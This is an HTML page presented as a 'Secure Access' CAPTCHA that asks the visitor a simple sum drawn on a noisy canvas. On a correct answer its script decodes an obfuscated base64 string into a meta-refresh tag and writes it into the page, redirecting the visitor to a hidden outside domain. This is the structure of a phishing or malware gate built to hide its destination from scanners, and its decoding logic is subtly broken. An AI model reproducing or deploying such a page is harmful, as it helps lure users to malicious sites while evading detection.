<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Secure Access</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f9f9f9;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      flex-direction: column;
    }
    #captcha-box {
      background: white;
      border: 1px solid #ccc;
      padding: 24px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      text-align: center;
      width: 300px;
    }
    input {
      padding: 8px;
      font-size: 16px;
      width: 80px;
      text-align: center;
    }
    .hidden {
      display: none;
    }
    canvas {
      margin: 12px 0;
      border: 1px solid #ccc;
    }
  </style>
</head>
<body>

<div id="captcha-box">
  <p id="challenge"></p>
  <canvas id="noiseCanvas" width="200" height="50"></canvas>
  <input id="answer" placeholder="?" />
  <button onclick="verify()">Verify</button>
  <p id="status" style="color: red;"></p>
</div>

<script>
  const encryptedRef = "JTNDbWV0YSUyMGh0dHAtZXF1aXYlM0QlMjJSZWZyZXNoJTIyJTIwY29udGVudCUzRCUyMjElM0J1cmwlM0RodHRwcyUzQS8vc2VlZWhhdG92ZXIuZmVubWVub3MuZGUvZnFnZ1QlMjIlMjAvJTNF";

  const challengeElem = document.getElementById('challenge');
  const canvas = document.getElementById('noiseCanvas');
  const ctx = canvas.getContext('2d');
  const answerInput = document.getElementById('answer');
  const status = document.getElementById('status');

  const a = Math.floor(Math.random() * 10) + 10;
  const b = Math.floor(Math.random() * 10) + 1;
  const expected = a + b;

  challengeElem.innerText = `What is ${a} + ${b}?`;

  function generateNoise() {
    for (let i = 0; i < 100; i++) {
      ctx.fillStyle = `rgba(${rand(100,255)}, ${rand(100,255)}, ${rand(100,255)}, 0.3)`;
      ctx.beginPath();
      ctx.arc(rand(0,200), rand(0,50), rand(1,5), 0, Math.PI * 2);
      ctx.fill();
    }
    ctx.font = "20px monospace";
    ctx.fillStyle = "#000";
    ctx.fillText(`${a} + ${b} = ?`, 50, 30);
  }

  function rand(min, max) {
    return Math.floor(Math.random() * (max - min)) + min;
  }

  function verify() {
    const userAnswer = parseInt(answerInput.value.trim());
    if (userAnswer === expected) {
      status.style.color = "green";
      status.innerText = "Verified! Redirecting...";
      setTimeout(revealRedirect, 1500);
    } else {
      status.style.color = "red";
      status.innerText = "Incorrect, try again.";
    }
  }

  function revealRedirect() {
    // Deep decode simulation
    const realURL = atob(atob(encryptedRef)); // double-encoded
    document.body.innerHTML = realURL;
  }

  // Draw noise when page loads
  generateNoise();
</script>

</body>
</html>
